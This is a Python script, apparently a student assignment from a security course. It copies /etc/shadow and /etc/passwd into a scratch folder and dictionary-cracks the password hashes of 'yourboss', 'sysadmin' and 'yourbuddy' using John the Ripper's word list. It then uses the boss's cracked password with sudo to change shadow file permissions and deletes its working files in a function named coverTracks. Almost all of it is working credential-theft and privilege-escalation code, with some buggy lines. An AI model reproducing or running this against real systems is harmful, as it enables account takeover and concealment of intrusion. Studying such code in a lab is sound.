#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
@date:   10/21/2018
@author: Luke Malloy
@course: CS3600
"""

import crypt, subprocess


def main():
    # process password files: make disposable directory for manuipulating copies of files

    # create temporary destroy directory
    subprocess.run(f" mkdir destroy", stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, shell=True)

    # give access to folder
    subprocess.run(f" chmod 777 destroy/", stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, shell=True)

    # shadow copy
    subprocess.run(f" cp /etc/shadow destroy/", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)

    # passwd copy
    subprocess.run(f" cp /etc/passwd destroy/", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)

    # make john password list copy
    subprocess.run(f" cp /usr/share/john/password.lst destroy/", stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                   shell=True)

    # grab copy of zipped pw file and unzip in destroy // rockyou.txt
    # subprocess.run(f" cp /usr/share/wordlists/rockyou.txt.gz destroy/", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    # cd_destroy()

    # subprocess.run(" gunzip -f rockyou.txt.gz", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)

    # crack boss password, sysadmin password
    cd_destroy()
    boss = pwlistcrack("yourboss", 'password.lst')
    # boss = pwlistcrack("yourboss", 'rockyou.txt')

    admin = pwlistcrack("sysadmin", 'password.lst')
    # admin = pwlistcrack("sysadmin", 'rockyou.txt')

    # placeholder until john is running
    buddy = pwlistcrack("yourbuddy", 'password.lst')
    # buddy = pwlistCrack("yourbuddy", 'rockyou.txt')

    # fix shadow permissions in of shadow and password files using yourboss acct
    fixShadowPersmissions(boss)

    # crack yourbuddy password using john the ripper

    # give tempworker sudo permissions

    # output 3 passwords to myout.txt
    pwlist = boss + '\n' + admin + '\n' + buddy
    # pwlist1 = 'yourbossespassword' + '\n' + 'yourbuddyspassword' + '\n' + 'sysadminpassword'
    # with open('/home/tempworker/myout.txt', 'w') as f:
    # f.write(pwlist)
    print(pwlist)
    coverTracks()

def fixShadowPersmissions(bosspw):
    fixPermissions = f'su yourboss -c \'echo {bosspw} | sudo -S chmod 640 /etc/shadow\''
    subprocess.run(fixPermissions, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True,
                   input=bosspw, shell=True)


def pwlistcrack(username, pwfile):
    # get salt and hash
    user_salt = getSalt(username)
    user_info = getUserInfo(username)

    # open password.lst
    with open(f'./destroy/{pwfile}', 'r') as f:
        pwlist = f.read().split()

    # try each word
    for pw in pwlist:
        hashval = crypt.crypt(pw, user_salt)

        # if salted hashes match!
        if (hashval == user_info):
            return pw
            f.close()
            break

    # Password not found
    if (hashval != user_info):
        f.close()


# go to destroy folder
def cd_destroy():
    # go to destroy folder
    subprocess.run(f" cd", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    subprocess.run(f" cd destroy", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)


# returns salt of username's pw
def getSalt(username):
    # returns string of user's info found in shadow file
    shadow = f" grep {username} ./destroy/shadow"
    shadowEntry = subprocess.run(shadow, stdout=subprocess.PIPE, universal_newlines=True, stderr=subprocess.STDOUT,
                                 shell=True)

    # strip down to algo, salt, hash of pw
    user_info = shadowEntry.stdout.split(':')[1]

    dollar = user_info.rfind('$')
    user_salt = user_info[:dollar]
    return user_salt


# returns username's corresponding line in shadow file
def getUserInfo(username):
    # returns string of user's info found in shadow file
    shadow = f" grep -Fe {username} ./destroy/shadow"
    shadowEntry = subprocess.run(shadow, stdout=subprocess.PIPE, universal_newlines=True, stderr=subprocess.STDOUT,
                                 shell=True)

    # strip down to algo, salt, hash of pw
    user_info = shadowEntry.stdout.split(':')[1]
    return user_info

def coverTracks():
    # delete destroy die
    subprocess.run(f" rm -rf ./destroy/", stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, shell=True)

if __name__ == '__main__':
    main()
